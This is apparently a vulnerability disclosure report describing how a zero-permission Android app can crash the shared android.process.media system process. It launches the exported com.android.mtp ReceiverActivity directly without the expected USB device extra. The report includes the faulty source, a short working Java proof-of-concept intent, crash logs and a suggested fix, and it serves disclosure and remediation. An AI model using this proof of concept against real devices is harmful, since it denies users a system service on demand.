# com.android.mtp — `ReceiverActivity` NullPointerException Crashes Shared `android.process.media` System Process (Zero-Permission DoS)

## Summary

`com.android.mtp` (the system MTP/PTP USB file-transfer service) exports `ReceiverActivity`, whose `<intent-filter>` matches the action `android.hardware.usb.action.USB_DEVICE_ATTACHED` — the same action string used for the genuinely protected broadcast Android sends when a real USB device is physically attached. Sending that action as a **broadcast** is correctly blocked for any non-privileged caller (confirmed: even `adb shell`, uid 2000, gets `SecurityException: Permission Denial: not allowed to send broadcast`). However, **protected-broadcast enforcement only applies to `Context.sendBroadcast()` delivery** — it has no effect on `startActivity()` intent resolution. `ReceiverActivity` itself declares no `android:permission`, so any zero-permission app can launch it directly via an explicit-component `Intent` carrying that same action string, entirely bypassing the protected-broadcast restriction.

`ReceiverActivity.onCreate()` unconditionally casts the intent's `"device"` extra to `UsbDevice` and immediately calls `.getDeviceId()` on it with no null check. A zero-permission app that simply omits this extra causes a `NullPointerException` that crashes the app's process — which, per `com.android.mtp`'s own manifest, runs in the **shared** system process `android.process.media`.

## Severity: MEDIUM (Availability — zero-permission crash of a shared system process)

- **Attack vector**: Local (malicious zero-permission app installed on device)
- **Permissions required**: ZERO
- **User interaction**: None
- **CIA impact**: Availability — a zero-permission app can force-crash the `android.process.media` system process on demand, at any time, with a single `startActivity()` call and no user interaction. Repeated triggering constitutes a persistent, trivially automatable Denial-of-Service against this shared system process.

## Affected Component

- **Package**: `com.android.mtp` (`/system/priv-app/MtpService/MtpService.apk`)
- **Activity**: `com.android.mtp.ReceiverActivity`
- **Process**: `android.process.media` (explicitly declared via `android:process` on the `com.android.mtp` `<application>` element — a well-known shared system process name used by multiple AOSP media/storage-related system components)

```
E: activity
    A: android:name="com.android.mtp.ReceiverActivity"
    A: android:exported=true
    (no android:permission attribute)
      E: intent-filter
          E: action android:name="android.hardware.usb.action.USB_DEVICE_ATTACHED"
```

## Root Cause

```java
// com/android/mtp/ReceiverActivity.java
protected void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    if ("android.hardware.usb.action.USB_DEVICE_ATTACHED".equals(getIntent().getAction())) {
        UsbDevice usbDevice = (UsbDevice) getIntent().getParcelableExtra("device");
        try {
            MtpDocumentsProvider mtpDocumentsProvider = MtpDocumentsProvider.getInstance();
            mtpDocumentsProvider.openDevice(usbDevice.getDeviceId());   // <-- NPE if "device" extra absent/wrong type
            ...
        } catch (IOException e) { ... }
    }
    finish();
}
```

`getParcelableExtra("device")` returns `null` whenever the caller simply doesn't supply that extra (or supplies the wrong type). The very next line dereferences it unconditionally — there is no null check, and unlike the adjacent `IOException` from `openDevice()`, a `NullPointerException` here is **not** caught by anything in this method, propagating up and crashing the process.

Normally this activity is only ever launched internally by the platform's real USB-attach dispatch flow, which always supplies a genuine `UsbDevice` extra — so this code path assumed a trusted caller. But because the activity is exported with no permission, and because the USB-attach action name being a *protected broadcast* creates a false sense that this trigger is restricted, nothing actually stops an arbitrary zero-permission app from invoking it directly and omitting the extra.

## Proof of Concept

A zero-permission app (`com.vrp.zeroperm`, no `<uses-permission>` at all) launches the activity directly, omitting the `"device"` extra:

```java
Intent i = new Intent("android.hardware.usb.action.USB_DEVICE_ATTACHED");
i.setComponent(new ComponentName("com.android.mtp", "com.android.mtp.ReceiverActivity"));
i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
startActivity(i);
```

### Dynamic result (Pixel 6a, Android 17 Beta / API 37, September 2026)

```
VRP-MtpCrash: startActivity() on ReceiverActivity returned normally (no SecurityException)
09-29 16:25:18.185  1505  1599 I ActivityManager: Start proc 14432:android.process.media/u0a84 for next-top-activity {com.android.mtp/com.android.mtp.ReceiverActivity}
09-29 16:25:18.244 14432 14432 E AndroidRuntime: FATAL EXCEPTION: main
09-29 16:25:18.244 14432 14432 E AndroidRuntime: Process: android.process.media, PID: 14432
09-29 16:25:18.244 14432 14432 E AndroidRuntime: java.lang.RuntimeException: Unable to start activity ComponentInfo{com.android.mtp/com.android.mtp.ReceiverActivity}
...
09-29 16:25:18.244 14432 14432 E AndroidRuntime: Caused by: java.lang.NullPointerException: Attempt to invoke virtual method 'int android.hardware.usb.UsbDevice.getDeviceId()' on a null object reference
09-29 16:25:18.244 14432 14432 E AndroidRuntime: 	at com.android.mtp.ReceiverActivity.onCreate(ReceiverActivity.java:44)
```

The system's own `ActivityManager` log confirms `referrer=com.vrp.zeroperm` for the launched task, and the standard Android "Application Error" crash dialog for `android.process.media` was shown on-screen (screenshot attached: `screenshot_crash_dialog.png`). The process (`android.process.media`, uid 10084) is confirmed via `adb shell dumpsys activity processes` to have crashed at exactly this moment.

Note: identical behavior was first confirmed via `adb shell am start` (crashing PID 9718) before building and confirming with the dedicated zero-permission PoC APK (crashing PID 14432) — both crash traces are identical (`ReceiverActivity.java:44`).

## Suggested Fix

Add a null check for `getParcelableExtra("device")` in `ReceiverActivity.onCreate()` before dereferencing it (finishing gracefully if absent), and/or require callers to hold a permission (or verify caller identity) before honoring this activity's `USB_DEVICE_ATTACHED` intent at all — since, as demonstrated, matching a protected-broadcast's action name in an `<activity>` intent-filter provides no actual protection against direct `startActivity()` invocation.

## Environment

- **Device**: Pixel 6a
- **OS**: Android 17 Beta (API 37), security patch 2026-07-05
- **Target package**: `com.android.mtp` (system priv-app)
- **Tested**: September 2026
